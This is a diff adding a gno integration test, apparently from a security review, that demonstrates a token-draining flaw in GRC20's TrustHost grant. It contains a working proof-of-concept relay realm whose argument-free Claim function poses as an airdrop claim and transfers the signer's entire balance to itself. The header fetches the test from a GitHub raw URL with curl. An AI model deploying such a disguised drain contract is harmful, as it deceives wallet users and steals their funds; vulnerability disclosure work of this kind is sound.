@@ -1,0 +1,103 @@
+# Asserts what PrivateLedger.TrustHost grants. Once a token trusts a relay, any
+# crossing function of that relay reached by a direct MsgCall moves the signing
+# user's whole balance, with no allowance and no argument naming the token.
+# Measured at e014175d2: alice signs `relay.Claim` with no arguments and her
+# 1000000 DRAIN leaves for the relay's address.
+#
+# Run: from a gno checkout:
+# gh pr checkout 6123 -R gnolang/gno && git checkout e014175d2
+# curl -fsSL -o gno.land/pkg/integration/testdata/grc20_trusted_host_drain.txtar \
+#   https://raw.githubusercontent.com/samouraiworld/gno-agent-workspace/main/reviews/pr/6xxx/6123-grc20-eoa-writes/1-e014175d2/tests/grc20_trusted_host_drain.txtar
+# go test -v -run 'TestTestdata/grc20_trusted_host_drain' ./gno.land/pkg/integration/
+# rm gno.land/pkg/integration/testdata/grc20_trusted_host_drain.txtar
+
+loadpkg gno.land/p/demo/tokens/grc20
+loadpkg gno.land/r/test/drtok $WORK/drtok
+loadpkg gno.land/r/test/relay $WORK/relay
+
+adduser alice
+
+gnoland start
+
+gnokey maketx send -send 50000000ugnot -to $alice_user_addr -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid tendermint_test test1
+stdout 'OK!'
+
+gnokey maketx call -pkgpath gno.land/r/test/drtok -func Faucet -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+gnokey query vm/qeval --data "gno.land/r/test/drtok.BalanceOf(\"$alice_user_addr\")"
+stdout '1000000 int64'
+
+# alice signs one MsgCall: pkgpath gno.land/r/test/relay, func Claim, no
+# arguments. The signing view carries no token, no amount and no recipient.
+gnokey maketx call -pkgpath gno.land/r/test/relay -func Claim -gas-fee 1000000ugnot -gas-wanted 10_000_000 -chainid=tendermint_test alice
+stdout OK
+
+gnokey query vm/qeval --data "gno.land/r/test/drtok.BalanceOf(\"$alice_user_addr\")"
+stdout '0 int64'        # IS:     a trusted relay spends the caller's whole balance from a call that names none of it
+# stdout '1000000 int64' # SHOULD: relaying is bounded to a write the signing user named
+
+gnokey query vm/qeval --data "gno.land/r/test/relay.Take()"
+stdout '1000000 int64'
+
+-- drtok/gnomod.toml --
+module = "gno.land/r/test/drtok"
+gno = "0.9"
+
+-- drtok/drtok.gno --
+package drtok
+
+import "gno.land/p/demo/tokens/grc20"
+
+var (
+	Token *grc20.Token
+	adm   *grc20.PrivateLedger
+)
+
+func init(cur realm) {
+	Token, adm = grc20.NewToken("DrainTok", "DRAIN", 4, 0, cur)
+	// The token opts one relay in. Nothing about the grant is scoped to an
+	// amount, a recipient, or a function of that relay.
+	adm.TrustHost("gno.land/r/test/relay")
+}
+
+func Faucet(cur realm) {
+	if err := adm.Mint(cur.Previous().Address(), 1_000_000); err != nil {
+		panic(err)
+	}
+}
+
+func BalanceOf(owner address) int64 { return Token.BalanceOf(owner) }
+
+-- relay/gnomod.toml --
+module = "gno.land/r/test/relay"
+gno = "0.9"
+
+-- relay/relay.gno --
+package relay
+
+import (
+	"chain"
+
+	"gno.land/r/test/drtok"
+)
+
+// Claim advertises itself as an airdrop claim. It is a plain crossing function
+// with no parameters, so a wallet shows the caller "relay.Claim()".
+func Claim(cur realm) {
+	victim := cur.Previous().Address()
+	all := drtok.Token.BalanceOf(victim)
+	if all == 0 {
+		return
+	}
+	// UserTellerTrusted is reachable from the published *Token, and this realm
+	// is in drtok's trustedHosts, so guardWrite admits it and the actor is the
+	// signing user.
+	if err := drtok.Token.UserTellerTrusted().Transfer(0, cur, cur.Address(), all); err != nil {
+		panic(err)
+	}
+}
+
+// Take reports what the relay collected.
+func Take() int64 {
+	return drtok.Token.BalanceOf(chain.PackageAddress("gno.land/r/test/relay"))
+}
